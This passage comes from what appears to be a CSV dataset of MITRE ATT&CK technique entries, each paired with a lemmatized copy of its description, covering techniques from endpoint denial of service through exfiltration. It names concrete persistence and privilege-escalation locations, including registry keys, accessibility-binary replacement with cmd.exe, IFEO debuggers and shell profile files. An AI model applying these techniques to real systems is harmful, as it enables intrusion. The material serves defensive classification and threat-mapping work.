renegotiation request cryptographic renegotiation meaningful cost computation cycle cause impact availability service volume
T1499.003,Endpoint Denial of Service: Application Exhaustion Flood,"Adversaries may target resource intensive features of applications to cause a denial of service (DoS), denying availability to those applications. For example, specific features in web applications may be highly resource intensive. Repeated requests to those features may be able to exhaust system resources and deny access to the application or the server itself.",adversary target resource intensive feature application cause denial service dos deny availability application example specific feature web application highly resource intensive repeat request feature able exhaust system resource deny access application server
T1499.004,Endpoint Denial of Service: Application or System Exploitation,"Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.Adversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as Data Destruction, Firmware Corruption, Service Stop etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems.",adversary exploit software vulnerability cause application system crash deny availability user system automatically restart critical application service crash occur likely exploit cause persistent denial service dos condition adversary exploit know zero day vulnerability crash application system lead dependent application system dos condition crash restart application system effect data destruction firmware corruption service stop etc cause dos condition deny availability critical information application system
T1611,Escape to Host,"Adversaries may break out of a container to gain access to the underlying host. This can allow an adversary access to other containerized resources from the host level or to the host itself. In principle, containerized resources should provide a clear separation of application functionality and be isolated from the host environment.There are multiple ways an adversary may escape to a host environment. Examples include creating a container configured to mount the host’s filesystem using the bind parameter, which allows the adversary to drop payloads and execute control utilities such as cron on the host; utilizing a privileged container to run commands or load a malicious kernel module on the underlying host; or abusing system calls such as unshare and keyctl to escalate privileges and steal secrets.Additionally, an adversary may be able to exploit a compromised container with a mounted container management socket, such as docker.sock, to break out of the container via a Container Administration Command.Gaining access to the host may provide the adversary with the opportunity to achieve follow-on objectives, such as establishing persistence, moving laterally within the environment, or setting up a command and control channel on the host.",adversary break container gain access underlying host allow adversary access containerize resource host level host principle containerized resource provide clear separation application functionality isolate host environment multiple way adversary escape host environment example include create container configure mount host filesystem bind parameter allow adversary drop payload execute control utility cron host utilize privileged container run command load malicious kernel module underlying host abuse system call unshare keyctl escalate privilege steal secret additionally adversary able exploit compromise container mount container management socket break container container administration command gain access host provide adversary opportunity achieve follow objective establish persistence move laterally environment set command control channel host
T1585,Establish Accounts,"Adversaries may create and cultivate accounts with services that can be used during targeting. Adversaries can create accounts that can be used to build a persona to further operations. Persona development consists of the development of public information, presence, history and appropriate affiliations. This development could be applied to social media, website, or other publicly available information that could be referenced and scrutinized for legitimacy over the course of an operation using that persona or identity.For operations incorporating social engineering, the utilization of an online persona may be important. These personas may be fictitious or impersonate real people. The persona may exist on a single site or across multiple sites (ex: Facebook, LinkedIn, Twitter, Google, GitHub, Docker Hub, etc.). Establishing a persona may require development of additional documentation to make them seem real. This could include filling out profile information, developing social networks, or incorporating photos.Establishing accounts can also include the creation of accounts with email providers, which may be directly leveraged for Phishing for Information or Phishing.",adversary create cultivate account service targeting adversary create account build persona operation persona development consist development public information presence history appropriate affiliation development apply social medium website publicly available information reference scrutinize legitimacy course operation persona identity operation incorporate social engineering utilization online persona important persona fictitious impersonate real people persona exist single site multiple site ex facebook linkedin twitter google github docker hub etc establish persona require development additional documentation real include fill profile information develop social network incorporate photo establish account include creation account email provider directly leverage phishing information phishing
T1585.001,Establish Accounts: Social Media Accounts,"Adversaries may create and cultivate social media accounts that can be used during targeting. Adversaries can create social media accounts that can be used to build a persona to further operations. Persona development consists of the development of public information, presence, history and appropriate affiliations.For operations incorporating social engineering, the utilization of a persona on social media may be important. These personas may be fictitious or impersonate real people. The persona may exist on a single social media site or across multiple sites (ex: Facebook, LinkedIn, Twitter, etc.). Establishing a persona on social media may require development of additional documentation to make them seem real. This could include filling out profile information, developing social networks, or incorporating photos. Once a persona has been developed an adversary can use it to create connections to targets of interest. These connections may be direct or may include trying to connect through others. These accounts may be leveraged during other phases of the adversary lifecycle, such as during Initial Access (ex: Spearphishing via Service).",adversary create cultivate social medium account targeting adversary create social medium account build persona operation persona development consist development public information presence history appropriate affiliation operation incorporate social engineering utilization persona social medium important persona fictitious impersonate real people persona exist single social medium site multiple site ex facebook linkedin twitter etc establish persona social medium require development additional documentation real include fill profile information develop social network incorporate photo persona develop adversary use create connection target interest connection direct include try connect account leveraged phase adversary lifecycle initial access ex spearphishing service
T1585.002,Establish Accounts: Email Accounts,"Adversaries may create email accounts that can be used during targeting. Adversaries can use accounts created with email providers to further their operations, such as leveraging them to conduct Phishing for Information or Phishing.To decrease the chance of physically tying back operations to themselves, adversaries may make use of disposable email services.",adversary create email account targeting adversary use account create email provider operation leverage conduct phishing information phishing decrease chance physically tie operation adversary use disposable email service
T1585.003,Establish Accounts: Cloud Accounts,"Adversaries may create accounts with cloud providers that can be used during targeting. Adversaries can use cloud accounts to further their operations, including leveraging cloud storage services such as Dropbox, MEGA, Microsoft OneDrive, or AWS S3 buckets for Exfiltration to Cloud Storage or to Upload Tools. Cloud accounts can also be used in the acquisition of infrastructure, such as Virtual Private Servers or Serverless infrastructure. Establishing cloud accounts may allow adversaries to develop sophisticated capabilities without managing their own servers.Creating Cloud Accounts may also require adversaries to establish Email Accounts to register with the cloud provider.",adversary create account cloud provider targeting adversary use cloud account operation include leverage cloud storage service dropbox mega microsoft onedrive aws bucket exfiltration cloud storage upload tools cloud account acquisition infrastructure virtual private servers serverless infrastructure establish cloud account allow adversary develop sophisticated capability manage server create cloud accounts require adversary establish email accounts register cloud provider
T1546,Event Triggered Execution,"Adversaries may establish persistence and/or elevate privileges using system mechanisms that trigger execution based on specific events. Various operating systems have means to monitor and subscribe to events such as logons or other user activity such as running specific applications/binaries. Cloud environments may also support various functions and services that monitor and can be invoked in response to specific cloud events.Adversaries may abuse these mechanisms as a means of maintaining persistent access to a victim via repeatedly executing malicious code. After gaining access to a victim system, adversaries may create/modify event triggers to point to malicious content that will be executed whenever the event trigger is invoked.Since the execution can be proxied by an account with higher permissions, such as SYSTEM or service accounts, an adversary may be able to abuse these triggered execution mechanisms to escalate their privileges.",adversary establish persistence elevate privilege system mechanism trigger execution base specific event operate system mean monitor subscribe event logon user activity run specific application binary cloud environment support function service monitor invoke response specific cloud event adversary abuse mechanism means maintain persistent access victim repeatedly execute malicious code gain access victim system adversary create modify event trigger point malicious content execute event trigger invoke execution proxie account high permission system service account adversary able abuse trigger execution mechanism escalate privilege
T1546.001,Event Triggered Execution: Change Default File Association,"Adversaries may establish persistence by executing malicious content triggered by a file type association. When a file is opened, the default program used to open the file (also called the file association or handler) is checked. File association selections are stored in the Windows Registry and can be edited by users, administrators, or programs that have Registry access or by administrators using the built-in assoc utility. Applications can modify the file association for a given file extension to call an arbitrary program when a file with the given extension is opened.System file associations are listed under HKEY_CLASSES_ROOT.\command. For example: HKEY_CLASSES_ROOT\txtfile\shell\open\command HKEY_CLASSES_ROOT\txtfile\shell\print\command HKEY_CLASSES_ROOT\txtfile\shell\printto\commandThe values of the keys listed are commands that are executed when the handler opens the file extension. Adversaries can modify these values to continually execute arbitrary commands.",adversary establish persistence execute malicious content trigger file type association file open default program open file call file association handler check file association selection store windows registry edit user administrator program registry access administrator build assoc utility application modify file association give file extension arbitrary program file give extension open system file association list example value key list command execute handler open file extension adversary modify value continually execute arbitrary command
T1546.002,Event Triggered Execution: Screensaver,"Adversaries may establish persistence by executing malicious content triggered by user inactivity. Screensavers are programs that execute after a configurable time of user inactivity and consist of Portable Executable (PE) files with a .scr file extension. The Windows screensaver application scrnsave.scr is located in C:\Windows\System32\, and C:\Windows\sysWOW64\ on 64-bit Windows systems, along with screensavers included with base Windows installations.The following screensaver settings are stored in the Registry (HKCU\Control Panel\Desktop\) and could be manipulated to achieve persistence:SCRNSAVE.exe - set to malicious PE path ScreenSaveActive - set to '1' to enable the screensaver ScreenSaverIsSecure - set to '0' to not require a password to unlock ScreenSaveTimeout - sets user inactivity timeout before screensaver is executedAdversaries can use screensaver settings to maintain persistence by setting the screensaver to run malware after a certain timeframe of user inactivity.",adversary establish persistence execute malicious content trigger user inactivity screensaver program execute configurable time user inactivity consist portable executable pe file file extension windows screensaver application locate bit windows system screensaver include base windows installation following screensaver setting store registry manipulate achieve persistence set malicious pe path screensaveactive set enable screensaver screensaverissecure set require password unlock screensavetimeout set user inactivity timeout screensaver executedadversarie use screensaver setting maintain persistence set screensaver run malware certain timeframe user inactivity
T1546.003,Event Triggered Execution: Windows Management Instrumentation Event Subscription,"Adversaries may establish persistence and elevate privileges by executing malicious content triggered by a Windows Management Instrumentation (WMI) event subscription. WMI can be used to install event filters, providers, consumers, and bindings that execute code when a defined event occurs. Examples of events that may be subscribed to are the wall clock time, user loging, or the computer's uptime.Adversaries may use the capabilities of WMI to subscribe to an event and execute arbitrary code when that event occurs, providing persistence on a system.WMI subscription execution is proxied by the WMI Provider Host process (WmiPrvSe.exe) and thus may result in elevated SYSTEM privileges.",adversary establish persistence elevate privilege execute malicious content trigger windows management instrumentation wmi event subscription wmi install event filter provider consumer binding execute code define event occur example event subscribe wall clock time user loging computer uptime adversary use capability wmi subscribe event execute arbitrary code event occur provide persistence system wmi subscription execution proxie wmi provider host process result elevated system privilege
T1546.004,Event Triggered Execution: Unix Shell Configuration Modification,"Adversaries may establish persistence through executing malicious commands triggered by a user’s shell. User Unix Shells execute several configuration scripts at different points throughout the session based on events. For example, when a user opens a command-line interface or remotely logs in (such as via SSH) a login shell is initiated. The login shell executes scripts from the system (/etc) and the user’s home directory (~/) to configure the environment. All login shells on a system use /etc/profile when initiated. These configuration scripts run at the permission level of their directory and are often used to set environment variables, create aliases, and customize the user’s environment. When the shell exits or terminates, additional shell scripts are executed to ensure the shell exits appropriately. Adversaries may attempt to establish persistence by inserting commands into scripts automatically executed by shells. Using bash as an example, the default shell for most GNU/Linux systems, adversaries may add commands that launch malicious binaries into the /etc/profile and /etc/profile.d files. Some malware targets the termination of a program to trigger execution, adversaries can use the ~/.bash_logout file to execute malicious commands at the end of a session. For macOS, the functionality of this technique is similar but may leverage zsh, the default shell for macOS 10.15+. When the Terminal.app is opened, the application launches a zsh login shell and a zsh interactive shell. The login shell configures the system environment using /etc/profile, /etc/zshenv, /etc/zprofile, and /etc/zlogin. The login shell then configures the user environment with ~/.zprofile and ~/.zlogin. The interactive shell uses the ~/.zshrc to configure the user environment. Upon exiting, /etc/zlogout and ~/.zlogout are executed. For legacy programs, macOS executes /etc/bashrc on startup.",adversary establish persistence execute malicious command trigger user shell user unix shells execute configuration script different point session base event example user open command line interface remotely log ssh login shell initiate login shell execute script system user home directory configure environment login shell system use profile initiate configuration script run permission level directory set environment variable create alias customize user environment shell exit terminate additional shell script execute ensure shell exit appropriately adversary attempt establish persistence insert command script automatically execute shell bash example default shell gnu linux system adversary add command launch malicious binary profile file malware target termination program trigger execution adversary use file execute malicious command end session macos functionality technique similar leverage zsh default shell macos open application launch zsh login shell zsh interactive shell login shell configure system environment profile zshenv zprofile zlogin login shell configure user environment interactive shell use configure user environment exit zlogout execute legacy program macos execute bashrc startup
T1546.005,Event Triggered Execution: Trap,"Adversaries may establish persistence by executing malicious content triggered by an interrupt signal. The trap command allows programs and shells to specify commands that will be executed upon receiving interrupt signals. A common situation is a script allowing for graceful termination and handling of common keyboard interrupts like ctrl+c and ctrl+d.Adversaries can use this to register code to be executed when the shell encounters specific interrupts as a persistence mechanism. Trap commands are of the following format trap 'command list' signals where ""command list"" will be executed when ""signals"" are received.",adversary establish persistence execute malicious content trigger interrupt signal trap command allow program shell specify command execute receive interrupt signal common situation script allow graceful termination handling common keyboard interrupt like adversary use register code execute shell encounter specific interrupt persistence mechanism trap command following format trap command list signal command list execute signal receive
T1546.006,Event Triggered Execution: LC_LOAD_DYLIB Addition,"Adversaries may establish persistence by executing malicious content triggered by the execution of tainted binaries. Mach-O binaries have a series of headers that are used to perform certain operations when a binary is loaded. The LC_LOAD_DYLIB header in a Mach-O binary tells macOS and OS X which dynamic libraries (dylibs) to load during execution time. These can be added ad-hoc to the compiled binary as long as adjustments are made to the rest of the fields and dependencies. There are tools available to perform these changes.Adversaries may modify Mach-O binary headers to load and execute malicious dylibs every time the binary is executed. Although any changes will invalidate digital signatures on binaries because the binary is being modified, this can be remediated by simply removing the LC_CODE_SIGNATURE command from the binary so that the signature isn’t checked at load time.",adversary establish persistence execute malicious content trigger execution tainted binary mach o binary series header perform certain operation binary load header mach o binary tell macos os x dynamic library dylib load execution time add ad hoc compile binary long adjustment rest field dependency tool available perform change adversary modify mach o binary header load execute malicious dylib time binary execute change invalidate digital signature binary binary modify remediate simply remove command binary signature check load time
T1546.007,Event Triggered Execution: Netsh Helper DLL,"Adversaries may establish persistence by executing malicious content triggered by Netsh Helper DLLs. Netsh.exe (also referred to as Netshell) is a command-line scripting utility used to interact with the network configuration of a system. It contains functionality to add helper DLLs for extending functionality of the utility. The paths to registered netsh.exe helper DLLs are entered into the Windows Registry at HKLM\SOFTWARE\Microsoft\Netsh.Adversaries can use netsh.exe helper DLLs to trigger execution of arbitrary code in a persistent manner. This execution would take place anytime netsh.exe is executed, which could happen automatically, with another persistence technique, or if other software (ex: VPN) is present on the system that executes netsh.exe as part of its normal functionality.",adversary establish persistence execute malicious content trigger netsh helper dll refer netshell command line scripting utility interact network configuration system contain functionality add helper dll extend functionality utility path register helper dll enter windows registry adversary use helper dll trigger execution arbitrary code persistent manner execution place anytime execute happen automatically persistence technique software ex vpn present system execute normal functionality
T1546.008,Event Triggered Execution: Accessibility Features,"Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by accessibility features. Windows contains accessibility features that may be launched with a key combination before a user has logged in (ex: when the user is on the Windows logon screen). An adversary can modify the way these programs are launched to get a command prompt or backdoor without logging in to the system.Two common accessibility programs are C:\Windows\System32\sethc.exe, launched when the shift key is pressed five times and C:\Windows\System32\utilman.exe, launched when the Windows + U key combination is pressed. The sethc.exe program is often referred to as ""sticky keys"", and has been used by adversaries for unauthenticated access through a remote desktop login screen. Depending on the version of Windows, an adversary may take advantage of these features in different ways. Common methods used by adversaries include replacing accessibility feature binaries or pointers/references to these binaries in the Registry. In newer versions of Windows, the replaced binary needs to be digitally signed for x64 systems, the binary must reside in %systemdir%\, and it must be protected by Windows File or Resource Protection (WFP/WRP). The Image File Execution Options Injection debugger method was likely discovered as a potential workaround because it does not require the corresponding accessibility feature binary to be replaced.For simple binary replacement on Windows XP and later as well as and Windows Server 2003/R2 and later, for example, the program (e.g., C:\Windows\System32\utilman.exe) may be replaced with ""cmd.exe"" (or another program that provides backdoor access). Subsequently, pressing the appropriate key combination at the login screen while sitting at the keyboard or when connected over Remote Desktop Protocol will cause the replaced file to be executed with SYSTEM privileges. Other accessibility features exist that may also be leveraged in a similar fashion: On-Screen Keyboard: C:\Windows\System32\osk.exe Magnifier: C:\Windows\System32\Magnify.exe Narrator: C:\Windows\System32\Narrator.exe Display Switcher: C:\Windows\System32\DisplaySwitch.exe App Switcher: C:\Windows\System32\AtBroker.exe",adversary establish persistence elevate privilege execute malicious content trigger accessibility feature windows contain accessibility feature launch key combination user log ex user windows logon screen adversary modify way program launch command prompt backdoor log system common accessibility program launch shift key press time launch windows u key combination press program refer sticky key adversary unauthenticated access remote desktop login screen depend version windows adversary advantage feature different way common method adversary include replace accessibility feature binary pointer reference binary registry new version windows replace binary need digitally sign system binary reside protect windows file resource protection wfp wrp image file execution option injection debugger method likely discover potential workaround require corresponding accessibility feature binary replace simple binary replacement windows xp later windows server later example program replace program provide backdoor access subsequently press appropriate key combination login screen sit keyboard connect remote desktop protocol cause replace file execute system privilege accessibility feature exist leverage similar fashion screen keyboard magnifier narrator display switcher app switcher
T1546.009,Event Triggered Execution: AppCert DLLs,"Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by AppCert DLLs loaded into processes. Dynamic-link libraries (DLLs) that are specified in the AppCertDLLs Registry key under HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\ are loaded into every process that calls the ubiquitously used application programming interface (API) functions CreateProcess, CreateProcessAsUser, CreateProcessWithLoginW, CreateProcessWithTokenW, or WinExec. Similar to Process Injection, this value can be abused to obtain elevated privileges by causing a malicious DLL to be loaded and run in the context of separate processes on the computer. Malicious AppCert DLLs may also provide persistence by continuously being triggered by API activity.",adversary establish persistence elevate privilege execute malicious content trigger appcert dll load process dynamic link library dll specify appcertdlls registry key load process call ubiquitously application programming interface api function createprocess createprocessasuser createprocesswithloginw createprocesswithtokenw winexec similar process injection value abuse obtain elevated privilege cause malicious dll load run context separate process computer malicious appcert dll provide persistence continuously trigger api activity
T1546.010,Event Triggered Execution: AppInit DLLs,"Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by AppInit DLLs loaded into processes. Dynamic-link libraries (DLLs) that are specified in the AppInit_DLLs value in the Registry keys HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Windows or HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows are loaded by user32.dll into every process that loads user32.dll. In practice this is nearly every program, since user32.dll is a very common library. Similar to Process Injection, these values can be abused to obtain elevated privileges by causing a malicious DLL to be loaded and run in the context of separate processes on the computer. Malicious AppInit DLLs may also provide persistence by continuously being triggered by API activity. The AppInit DLL functionality is disabled in Windows 8 and later versions when secure boot is enabled.",adversary establish persistence elevate privilege execute malicious content trigger appinit dll load process dynamic link library dll specify value registry key load process load practice nearly program common library similar process injection value abuse obtain elevated privilege cause malicious dll load run context separate process computer malicious appinit dll provide persistence continuously trigger api activity appinit dll functionality disable windows later version secure boot enable
T1546.011,Event Triggered Execution: Application Shimming,"Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by application shims. The Microsoft Windows Application Compatibility Infrastructure/Framework (Application Shim) was created to allow for backward compatibility of software as the operating system codebase changes over time. For example, the application shimming feature allows developers to apply fixes to applications (without rewriting code) that were created for Windows XP so that it will work with Windows 10. Within the framework, shims are created to act as a buffer between the program (or more specifically, the Import Address Table) and the Windows OS. When a program is executed, the shim cache is referenced to determine if the program requires the use of the shim database (.sdb). If so, the shim database uses hooking to redirect the code as necessary in order to communicate with the OS. A list of all shims currently installed by the default Windows installer (sdbinst.exe) is kept in:%WINDIR%\AppPatch\sysmain.sdb and hklm\software\microsoft\windows nt\currentversion\appcompatflags\installedsdbCustom databases are stored in:%WINDIR%\AppPatch\custom & %WINDIR%\AppPatch\AppPatch64\Custom and hklm\software\microsoft\windows nt\currentversion\appcompatflags\customTo keep shims secure, Windows designed them to run in user mode so they cannot modify the kernel and you must have administrator privileges to install a shim. However, certain shims can be used to Bypass User Account Control (UAC and RedirectEXE), inject DLLs into processes (InjectDLL), disable Data Execution Prevention (DisableNX) and Structure Exception Handling (DisableSEH), and intercept memory addresses (GetProcAddress).Utilizing these shims may allow an adversary to perform several malicious acts such as elevate privileges, install backdoors, disable defenses like Windows Defender, etc. Shims can also be abused to establish persistence by continuously being invoked by affected programs.",adversary establish persistence elevate privilege execute malicious content trigger application shim microsoft windows application compatibility infrastructure framework application shim create allow backward compatibility software operate system codebase change time example application shimming feature allow developer apply fix application rewrite code create windows xp work windows framework shim create act buffer program specifically import address table windows os program execute shim cache reference determine program require use shim database shim database use hooking redirect code necessary order communicate os list shim currently instal default windows installer keep database store shim secure windows design run user mode modify kernel administrator privilege install shim certain shim bypass user account control uac redirectexe inject dll process injectdll disable data execution prevention disablenx structure exception handling disableseh intercept memory address shim allow adversary perform malicious act elevate privilege install backdoor disable defense like windows defender etc shim abuse establish persistence continuously invoke affected program
T1546.012,Event Triggered Execution: Image File Execution Options Injection,"Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by Image File Execution Options (IFEO) debuggers. IFEOs enable a developer to attach a debugger to an application. When a process is created, a debugger present in an application’s IFEO will be prepended to the application’s name, effectively launching the new process under the debugger (e.g., C:\dbg\ntsd.exe -g notepad.exe). IFEOs can be set directly via the Registry or in Global Flags via the GFlags tool. IFEOs can also enable an arbitrary monitor program to be launched when a specified program silently exits (i.e. is prematurely terminated by itself or a second, non kernel-mode process). Similar to Accessibility Features, on Windows Vista and later as well as Windows Server 2008 and later, a Registry key may be modified that configures ""cmd.exe,"" or another program that provides backdoor access, as a ""debugger"" for an accessibility program (ex: utilman.exe). After the Registry is modified, pressing the appropriate key combination at the login screen while at the keyboard or when connected with Remote Desktop Protocol will cause the ""debugger"" program to be executed with SYSTEM privileges. Similar to Process Injection, these values may also be abused to obtain privilege escalation by causing a malicious executable to be loaded and run in the context of separate processes on the computer. Installing IFEO mechanisms may also provide Persistence via continuous triggered invocation.Malware may also use IFEO to Impair Defenses by registering invalid debuggers that redirect and effectively disable various system and security applications.",adversary establish persistence elevate privilege execute malicious content trigger image file execution options ifeo debugger ifeos enable developer attach debugger application process create debugger present application ifeo prepende application effectively launch new process debugger ifeos set directly registry global flags gflags tool ifeos enable arbitrary monitor program launch specify program silently exit prematurely terminate second non kernel mode process similar accessibility features windows vista later windows server later registry key modify configure program provide backdoor access debugger accessibility program ex registry modify press appropriate key combination login screen keyboard connect remote desktop protocol cause debugger program execute system privilege similar process injection value abuse obtain privilege escalation cause malicious executable load run context separate process computer instal ifeo mechanism provide persistence continuous trigger invocation malware use ifeo impair defense register invalid debugger redirect effectively disable system security application
T1546.013,Event Triggered Execution: PowerShell Profile,"Adversaries may gain persistence and elevate privileges by executing malicious content triggered by PowerShell profiles. A PowerShell profile (profile.ps1) is a script that runs when PowerShell starts and can be used as a logon script to customize user environments.PowerShell supports several profiles depending on the user or host program. For example, there can be different profiles for PowerShell host programs such as the PowerShell console, PowerShell ISE or Visual Studio Code. An administrator can also configure a profile that applies to all users and host programs on the local computer. Adversaries may modify these profiles to include arbitrary commands, functions, modules, and/or PowerShell drives to gain persistence. Every time a user opens a PowerShell session the modified script will be executed unless the -NoProfile flag is used when it is launched. An adversary may also be able to escalate privileges if a script in a PowerShell profile is loaded and executed by an account with higher privileges, such as a domain administrator.",adversary gain persistence elevate privilege execute malicious content trigger powershell profile powershell profile script run powershell start logon script customize user environment powershell support profile depend user host program example different profile powershell host program powershell console powershell ise visual studio code administrator configure profile apply user host program local computer adversary modify profile include arbitrary command function module powershell drive gain persistence time user open powershell session modify script execute flag launch adversary able escalate privilege script powershell profile load execute account high privilege domain administrator
T1546.014,Event Triggered Execution: Emond,"Adversaries may gain persistence and elevate privileges by executing malicious content triggered by the Event Monitor Daemon (emond). Emond is a Launch Daemon that accepts events from various services, runs them through a simple rules engine, and takes action. The emond binary at /sbin/emond will load any rules from the /etc/emond.d/rules/ directory and take action once an explicitly defined event takes place.The rule files are in the plist format and define the name, event type, and action to take. Some examples of event types include system startup and user authentication. Examples of actions are to run a system command or send an email. The emond service will not launch if there is no file present in the QueueDirectories path /private/var/db/emondClients, specified in the Launch Daemon configuration file at/System/Library/LaunchDaemons/com.apple.emond.plist.Adversaries may abuse this service by writing a rule to execute commands when a defined event occurs, such as system start up or user authentication. Adversaries may also be able to escalate privileges from administrator to root as the emond service is executed with root privileges by the Launch Daemon service.",adversary gain persistence elevate privilege execute malicious content trigger event monitor daemon emond emond launch daemon accept event service run simple rule engine take action emond binary emond load rule directory action explicitly define event take place rule file plist format define event type action example event type include system startup user authentication example action run system command send email emond service launch file present queuedirectories path var db emondclient specify launch daemon configuration file system library launchdaemons adversary abuse service write rule execute command define event occur system start user authentication adversary able escalate privilege administrator root emond service execute root privilege launch daemon service
T1546.015,Event Triggered Execution: Component Object Model Hijacking,"Adversaries may establish persistence by executing malicious content triggered by hijacked references to Component Object Model (COM) objects. COM is a system within Windows to enable interaction between software components through the operating system. References to various COM objects are stored in the Registry. Adversaries can use the COM system to insert malicious code that can be executed in place of legitimate software through hijacking the COM references and relationships as a means for persistence. Hijacking a COM object requires a change in the Registry to replace a reference to a legitimate system component which may cause that component to not work when executed. When that system component is executed through normal system operation the adversary's code will be executed instead. An adversary is likely to hijack objects that are used frequently enough to maintain a consistent level of persistence, but are unlikely to break noticeable functionality within the system as to avoid system instability that could lead to detection.",adversary establish persistence execute malicious content trigger hijack reference component object model com object com system windows enable interaction software component operate system reference com object store registry adversary use com system insert malicious code execute place legitimate software hijack com reference relationship means persistence hijack com object require change registry replace reference legitimate system component cause component work execute system component execute normal system operation adversary code execute instead adversary likely hijack object frequently maintain consistent level persistence unlikely break noticeable functionality system avoid system instability lead detection
T1546.016,Event Triggered Execution: Installer Packages,"Adversaries may establish persistence and elevate privileges by using an installer to trigger the execution of malicious content. Installer packages are OS specific and contain the resources an operating system needs to install applications on a system. Installer packages can include scripts that run prior to installation as well as after installation is complete. Installer scripts may inherit elevated permissions when executed. Developers often use these scripts to prepare the environment for installation, check requirements, download dependencies, and remove files after installation.Using legitimate applications, adversaries have distributed applications with modified installer scripts to execute malicious content. When a user installs the application, they may be required to grant administrative permissions to allow the installation. At the end of the installation process of the legitimate application, content such as macOS postinstall scripts can be executed with the inherited elevated permissions. Adversaries can use these scripts to execute a malicious executable or install other malicious components (such as a Launch Daemon) with the elevated permissions.Depending on the distribution, Linux versions of package installer scripts are sometimes called maintainer scripts or post installation scripts. These scripts can include preinst, postinst, prerm, postrm scripts and run as root when executed.For Windows, the Microsoft Installer services uses .msi files to manage the installing, updating, and uninstalling of applications. Adversaries have leveraged Prebuild and Postbuild events to run commands before or after a build when installing .msi files.",adversary establish persistence elevate privilege installer trigger execution malicious content installer package os specific contain resource operate system need install application system installer package include script run prior installation installation complete installer script inherit elevate permission execute developer use script prepare environment installation check requirement download dependency remove file installation legitimate application adversary distribute application modify installer script execute malicious content user install application require grant administrative permission allow installation end installation process legitimate application content macos postinstall script execute inherit elevated permission adversary use script execute malicious executable install malicious component launch daemon elevated permission depend distribution linux version package installer script call maintainer script post installation script script include preinst postinst prerm postrm script run root execute windows microsoft installer service use file manage installing updating uninstalling application adversary leverage prebuild postbuild event run command build instal file
T1480,Execution Guardrails,"Adversaries may use execution guardrails to constrain execution or actions based on adversary supplied and environment specific conditions that are expected to be present on the target. Guardrails ensure that a payload only executes against an intended target and reduces collateral damage from an adversary’s campaign.Guardrails can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within. This use of guardrails is distinct from typical Virtualization/Sandbox Evasion. While use of Virtualization/Sandbox Evasion may involve checking for known sandbox values and continuing with execution only if there is no match, the use of guardrails will involve checking for an expected target-specific value and only continuing with execution if there is such a match.",adversary use execution guardrail constrain execution action base adversary supply environment specific condition expect present target guardrail ensure payload execute intended target reduce collateral damage adversary campaign guardrail prevent exposure capability environment intend compromise operate use guardrail distinct typical virtualization sandbox evasion use virtualization sandbox evasion involve check know sandbox value continue execution match use guardrail involve check expect target specific value continue execution match
T1480.001,Execution Guardrails: Environmental Keying,"Adversaries may environmentally key payloads or other features of malware to evade defenses and constraint execution to a specific target environment. Environmental keying uses cryptography to constrain execution or actions based on adversary supplied environment specific conditions that are expected to be present on the target. Environmental keying is an implementation of Execution Guardrails that utilizes cryptographic techniques for deriving encryption/decryption keys from specific types of values in a given computing environment.Values can be derived from target-specific elements and used to generate a decryption key for an encrypted payload. Target-specific values can be derived from specific network shares, physical devices, software/software versions, files, joined AD domains, system time, and local/external IP addresses. These difficulties can slow down the incident response process and help adversaries hide their tactics, techniques, and procedures (TTPs).Similar to Obfuscated Files or Information, adversaries may use environmental keying to help protect their TTPs and evade detection. Environmental keying may be used to deliver an encrypted payload to the target that will use target-specific values to decrypt the payload before execution. This can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within.Like other Execution Guardrails, environmental keying can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within. This activity is distinct from typical Virtualization/Sandbox Evasion. While use of Virtualization/Sandbox Evasion may involve checking for known sandbox values and continuing with execution only if there is no match, the use of environmental keying will involve checking for an expected target-specific value that must match for decryption and subsequent execution to be successful.",adversary environmentally key payload feature malware evade defense constraint execution specific target environment environmental keying use cryptography constrain execution action base adversary supply environment specific condition expect present target environmental keying implementation execution guardrails utilize cryptographic technique derive encryption decryption key specific type value give computing environment value derive target specific element generate decryption key encrypt payload target specific value derive specific network share physical device software software version file join ad domain system time local external ip address difficulty slow incident response process help adversary hide tactic technique procedure obfuscated files information adversary use environmental keying help protect ttp evade detection environmental keying deliver encrypt payload target use target specific value decrypt payload execution prevent exposure capability environment intend compromise operate like execution guardrails environmental keying prevent exposure capability environment intend compromise operate activity distinct typical virtualization sandbox evasion use virtualization sandbox evasion involve check know sandbox value continue execution match use environmental keying involve check expected target specific value match decryption subsequent execution successful
T1048,Exfiltration Over Alternative Protocol,"Adversaries may steal data by exfiltrating it over a different protocol than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server. Alternate protocols include FTP, SMTP, HTTP/S, DNS, SMB, or any other network protocol not being used as the main command and control channel. Adversaries may also opt to encrypt and/or obfuscate these alternate channels. Exfiltration Over Alternative Protocol can be done using various common operating system utilities such as Net/SMB or FTP.Many IaaS and SaaS platforms (such as Microsoft Exchange, Microsoft SharePoint, GitHub, and AWS S3) support the direct download of files, emails, source code, and other sensitive information via the web console or Cloud API.",adversary steal datum exfiltrate different protocol exist command control channel datum send alternate network location main command control server alternate protocol include ftp smtp http s dns smb network protocol main command control channel adversary opt encrypt obfuscate alternate channel exfiltration alternative protocol common operate system utility net smb iaas saas platform microsoft exchange microsoft sharepoint github aws support direct download file email source code sensitive information web console cloud api
